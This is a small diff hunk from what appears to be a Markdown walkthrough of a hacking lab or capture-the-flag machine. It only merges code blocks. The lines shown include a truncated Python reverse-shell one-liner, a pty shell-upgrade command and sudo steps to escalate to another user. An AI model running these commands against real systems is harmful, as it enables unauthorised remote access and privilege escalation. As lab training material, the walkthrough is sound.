@@ -41,11 +41,7 @@ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOC
 
 ```
 sudo -l
-```
-```
 python3 -c "import pty;pty.spawn('/bin/bash')"
-```
-```
 sudo -u scriptmanager bash -i
 ```
 ![image](https://user-images.githubusercontent.com/33616880/231083178-a2ff7d4c-fbbf-4701-885e-399f0a2bd732.png)
